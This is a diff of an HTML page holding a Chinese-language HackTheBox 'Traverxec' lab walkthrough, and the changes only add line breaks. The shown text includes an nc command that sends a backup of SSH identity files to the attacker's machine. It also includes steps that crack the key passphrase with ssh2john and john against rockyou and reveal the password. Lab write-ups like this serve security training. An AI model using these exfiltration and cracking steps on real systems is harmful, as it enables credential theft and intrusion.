@@ -7544,7 +7544,7 @@
 
 <h2 id="traverxec">Traverxec</h2>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583392151788-97534816-aa9c-4d16-9cb7-07479ef6a4c4-341809.png" /></p>
-<p>常规扫端口：
+<p>常规扫端口：<br />
 <code>nmap -A -sC 10.10.10.165</code></p>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583394361715-4e861fdc-9d64-42e1-897a-e1cafbb5036d-270301.png" /></p>
 <p>访问 80 端口，发现有个发邮件的功能</p>
@@ -7557,7 +7557,7 @@
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583396236352-90c4c72f-6bd9-48d1-b40a-5d233655f883-193628.png" /></p>
 <p>看一下 /etc/passwd，发现有个叫 david 的用户</p>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583397030862-782e9fe5-6c4d-4947-b220-e2508d4425f3-332271.png" /></p>
-<p>可以使用：<code>python -c "import pty;pty.spawn('/bin/bash')"</code>
+<p>可以使用：<code>python -c "import pty;pty.spawn('/bin/bash')"</code><br />
 来生成一个比较好看的终端样子，就像下面这样</p>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583398172841-627f8082-9d3c-4808-8f90-04060fde90f7-813916.png" /></p>
 <p>cd 到 /var/nostromo/conf 看一下有啥，<code>ls -al</code>  起码要用 -a 啊，不要错过什么东西</p>
@@ -7566,16 +7566,16 @@
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583399234143-61a43955-e78f-46aa-8ee2-5e8f2118ad91-037603.png" /></p>
 <p>进去看一下：</p>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583399399878-0fde0bfa-6bae-4069-b68c-7c68614cb024-070219.png" /></p>
-<p>新开一个终端，<code>nc -lvp 10001 &gt;backup-ssh-identity-files.tgz</code> 用来接收那个压缩包
+<p>新开一个终端，<code>nc -lvp 10001 &gt;backup-ssh-identity-files.tgz</code> 用来接收那个压缩包<br />
 shell 里面使用 <code>nc 10.10.15.84 10001 &lt; backup-ssh-identity-files.tgz</code></p>
 <p>这样就把压缩包给下到本地 kali 机了</p>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583401964294-1cc6d7d1-c1c8-4e3e-8d32-5f963ee1596e-468057.png" /></p>
 <p>下载出来的文件里有 ssh 的密钥</p>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583402001353-42977e7f-8a97-42ca-8c7a-f631a5e73bac-901610.png" /></p>
 <p>使用 jhon 破解一下看看把</p>
-<p><code>/usr/share/john/ssh2john.py /root/Desktop/home/david/.ssh/id_rsa &gt; id_rsa.hash</code>
+<p><code>/usr/share/john/ssh2john.py /root/Desktop/home/david/.ssh/id_rsa &gt; id_rsa.hash</code><br />
 先换成 jhon 能识别的格式</p>
-<p><code>/sbin/john /root/Desktop/home/david/.ssh/id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt</code>
+<p><code>/sbin/john /root/Desktop/home/david/.ssh/id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt</code><br />
 rockyou.txt 字典爆破一波</p>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583402473405-bb3c5066-75bf-48d0-b258-04ed088b8540-872276.png" /></p>
 <p>得到密钥密码，hunter</p>
@@ -7592,8 +7592,8 @@ rockyou.txt 字典爆破一波</p>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583403313743-6eb1c6ae-fa72-4f4d-a3ae-9a1b7179751f-715143.png" /></p>
 <p>惊了！？</p>
 <p><img alt="image.png" src="../img/551828_ct22lhet40e9yhhd/1583403365329-8de1f6ed-bfcf-43dd-85a8-c4647b62b3d5-897918.png" /></p>
-<p>参考：
-<a href="https://ca0y1h.top/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/">https://ca0y1h.top/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/</a>
+<p>参考：<br />
+<a href="https://ca0y1h.top/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/">https://ca0y1h.top/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/</a><br />
 <a href="https://www.lofter.com/lpost/1df46e99_1c73cc6b6">https://www.lofter.com/lpost/1df46e99_1c73cc6b6</a></p>
 <blockquote>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/web/kgz3n7">https://www.yuque.com/hxfqg9/web/kgz3n7</a></p>
